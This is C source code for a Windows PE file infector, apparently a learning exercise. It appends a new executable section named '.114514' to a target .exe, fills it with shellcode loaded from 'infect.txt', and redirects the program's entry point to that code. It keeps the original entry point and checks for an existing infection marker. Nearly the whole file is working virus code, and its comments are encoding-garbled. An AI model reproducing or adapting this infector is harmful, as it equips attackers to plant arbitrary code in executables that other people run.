#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <winnt.h>

#define alig_up(a, s) ((a+s-1) & (~ (s-1)))

int rw_file(char filepath[], LPVOID buf, size_t _ElementSize, int cnt, int offset, int rwf, DWORD origin){
    HANDLE hFile = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER pLocalFile;  //  LARGE_INTEGER��ʾһ��64λ�з�������
        pLocalFile.QuadPart = offset;
        DWORD dwReadedSize;
        DWORD dwResult = SetFilePointerEx(hFile, pLocalFile, &pLocalFile, origin);
        if (dwResult != INVALID_SET_FILE_POINTER) {
            if (rwf == 0){  // ���ļ�
                ReadFile(hFile, buf, _ElementSize * cnt, &dwReadedSize, NULL);
            }
            else{
                WriteFile(hFile, buf, _ElementSize * cnt, &dwReadedSize, NULL);   
            }
            CloseHandle(hFile);
            return 0;
        }
        CloseHandle(hFile);
    }
    return -1;
}

void add_virus_section(char filepath[]){
    IMAGE_DOS_HEADER DosHeader;
    IMAGE_NT_HEADERS NtHeaders;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER OptionalHeader;
    IMAGE_SECTION_HEADER StartSH; // ��һ���ڱ���
    IMAGE_SECTION_HEADER VirusSH; // ���ڴ洢�¼ӵĽڱ���
    IMAGE_SECTION_HEADER EndSH;   // �洢�ɵĽڱ���

    //! ��ȡ���ļ�ͷ��Ϣ����ȡ��Ҫ��������
    
    rw_file(filepath, &DosHeader, sizeof(IMAGE_DOS_HEADER), 1, 0, 0, FILE_BEGIN);
    rw_file(filepath,&NtHeaders, sizeof(IMAGE_NT_HEADERS), 1, DosHeader.e_lfanew, 0, FILE_BEGIN);

    FileHeader = NtHeaders.FileHeader;
    OptionalHeader = NtHeaders.OptionalHeader;

    int OldSN = FileHeader.NumberOfSections;
    int StartSO = DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS);  // ��һ���ڱ���ƫ��
    int EndSO = DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (OldSN - 1) * sizeof(IMAGE_SECTION_HEADER);  // ���һ���ڱ���ƫ��
    printf("NtHeader Entry: 0x%0x, NumberOfSections: %d\n",DosHeader.e_lfanew, OldSN);

    rw_file(filepath, &StartSH, sizeof(IMAGE_SECTION_HEADER), 1, StartSO, 0, FILE_BEGIN);
    
    rw_file(filepath, &EndSH, sizeof(IMAGE_SECTION_HEADER), 1, EndSO, 0, FILE_BEGIN);

    //! �ж��Ƿ��Ѿ�����Ⱦ
    if(!strcmp(EndSH.Name, ".114514")){
        printf("have been infected\n");
		return;
    }

    printf("Machine: %d\n", FileHeader.Machine);
    printf("Number of sections: %d\n", FileHeader.NumberOfSections);
    printf("Time date stamp: %d\n", FileHeader.TimeDateStamp);
    printf("Size of optional header: %d\n", OldSN);
    printf("Characteristics: %ld\n", FileHeader.Characteristics);
    printf("Magic: %d\n", OptionalHeader.Magic);
    printf("Address of entry point: 0x%0x\n", OptionalHeader.AddressOfEntryPoint);
    printf("Base of code: 0x%0x\n", OptionalHeader.BaseOfCode);
    printf("Base of data: 0x%0x\n", OptionalHeader.BaseOfData);
    printf("Image base: 0x%0x\n", OptionalHeader.ImageBase);
    printf("Section alignment: %d\n", OptionalHeader.SectionAlignment);
    printf("File alignment: %d\n", OptionalHeader.FileAlignment);
    printf("Size of image: %d\n", OptionalHeader.SizeOfImage);

    //! ��ӽڵ�׼�����������ӽ�����������޸�Entyrpoint
    NtHeaders.FileHeader.NumberOfSections += 1;
    DWORD OldAEP  = OptionalHeader.AddressOfEntryPoint;
    NtHeaders.OptionalHeader.AddressOfEntryPoint = EndSH.VirtualAddress + alig_up(EndSH.SizeOfRawData, 0x1000);
    printf("Old AddressOfEntryPoint: 0x%0x, New AddressOfEntryPoint: 0x%0x\n", OldAEP, NtHeaders.OptionalHeader.AddressOfEntryPoint);

    //! ��ȡ�����غɣ����data�����С
    char shellcode_file[100] = "infect.txt";
    HANDLE hshellcode_file = CreateFile(shellcode_file, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    int size;
    if (hshellcode_file != INVALID_HANDLE_VALUE) {
        size = (int)GetFileSize(hshellcode_file, NULL);
        CloseHandle(hshellcode_file);
    }
	INT8 data[alig_up(size, 0x200)];
    memset(data, 0x90, sizeof data);
    rw_file(shellcode_file, data, sizeof(INT8), size, 0, 0, FILE_BEGIN);
	printf("shellcode size: %0x", size);

    //! ��ʼ����
    VirusSH.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
    VirusSH.PointerToRawData = EndSH.PointerToRawData + EndSH.SizeOfRawData;
    VirusSH.VirtualAddress = NtHeaders.OptionalHeader.AddressOfEntryPoint;
    VirusSH.Misc.VirtualSize = size;
    VirusSH.SizeOfRawData = alig_up(size, 0x200);
    strcpy((char *)VirusSH.Name, ".114514");

    //! ��д�޸ĺ���������
    NtHeaders.OptionalHeader.SizeOfImage += alig_up(size, 0x1000);
   	
    rw_file(filepath, &NtHeaders, sizeof(IMAGE_NT_HEADERS), 1, DosHeader.e_lfanew, 1, FILE_BEGIN);
    
    rw_file(filepath, &VirusSH, sizeof(IMAGE_SECTION_HEADER), 1, EndSO + sizeof(IMAGE_SECTION_HEADER), 1, FILE_BEGIN);
    
    rw_file(filepath, &OldAEP, sizeof(int), 1, StartSH.PointerToRawData - 4, 1, FILE_BEGIN);
    
    rw_file(filepath, data, sizeof(INT8), alig_up(size, 0x200), VirusSH.PointerToRawData, 1, FILE_BEGIN);
    printf("Successfully infect!\n");
    
}

int main () {
    char filepath[100] = ".\\test.exe";
    add_virus_section(filepath);
    return 0;
}